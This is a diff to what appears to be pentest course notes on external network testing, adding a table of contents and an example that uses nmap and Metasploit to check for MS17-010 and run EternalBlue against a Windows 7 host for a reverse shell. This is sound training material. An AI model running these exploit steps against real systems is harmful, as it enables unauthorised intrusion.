@@ -1,3 +1,25 @@
+- [Module 05 - Network PenTest - External](#module-05---network-pentest---external)
+  - [Steps](#steps)
+  - [Port Scanning](#port-scanning)
+    - [Discover live hosts](#discover-live-hosts)
+    - [Identify Default Open Ports](#identify-default-open-ports)
+    - [Use Connect Scan](#use-connect-scan)
+    - [Use SYN scan](#use-syn-scan)
+    - [Use Illegal Flag Combinations](#use-illegal-flag-combinations)
+    - [Use ACK Flag Probe Scan](#use-ack-flag-probe-scan)
+    - [UDP Scan](#udp-scan)
+    - [Use Fragmentation Scan](#use-fragmentation-scan)
+  - [OS and Service Fingerprinting](#os-and-service-fingerprinting)
+    - [Fingerprinting the OS](#fingerprinting-the-os)
+    - [Fingerprinting the Services](#fingerprinting-the-services)
+  - [Vulnerability Research](#vulnerability-research)
+    - [External Vulnerability Assessment](#external-vulnerability-assessment)
+    - [Search and Map the Target](#search-and-map-the-target)
+    - [Find Out the Security Vulnerability Exploits](#find-out-the-security-vulnerability-exploits)
+  - [Exploit Verification](#exploit-verification)
+    - [Run the Exploits Against Identified Vulnerabilities](#run-the-exploits-against-identified-vulnerabilities)
+  - [Document the result](#document-the-result)
+
 # Module 05 - Network PenTest - External
 External network pentest has the focus on assessing the assets and identifying the vulnerabilities that could help attackers to exploit the network from outside.
 ## Steps
@@ -144,3 +166,25 @@ Finding exploits:
 - [Searchsploit](https://www.exploit-db.com/searchsploit), commad-line utility
 
 ## Exploit Verification
+1. Find exploits for different network vulnerabilities.
+2. Check the exploits, you're responsible for anything that gets executed. Know what the exploit does.
+3. Run the exploit.
+
+### Run the Exploits Against Identified Vulnerabilities
+Preferred tools: Metasploit, scripts
+
+**Example: Exploiting SMB vulnerability in Windows 7 Ultimate**
+1. Run `nmap` and identify open ports: `nmap -T4 -A -sV <IP_ADDRESS>`
+2. If port 445 is open (*it shouldn't, that's a finding to report!*) obtain more information: `nmap --script=smb-os-discovery -p 445 <IP_ADDRESS>`
+3. Start Metasploit: `msfconsole`
+4. In Metasploit run the command: `use auxiliary/scanner/smb/smb_ms17_010`
+5. Set the remote host: `set RHOSTS <IP_ADDRESS>`
+6. Execute the scan and study the results: `run`
+7. If the scan result is that the host is vulnerable search for an exploit (in Metasploit or do a Google search, pretend we found `ms17_010_eternalblue`).
+8. In Metasploit run the command: `use exploit/windows/smb/ms17_010_eternalblue`
+9. Set the remote host: `set RHOSTS <IP_ADDRESS>`
+10. Execute the exploit: `exploit`, if it works, we'll have a reverse shell to the host.
+
+## Document the result
+- The list of ports, OS, services and their versions.
+- Ports and services through which exploitation could be possible.
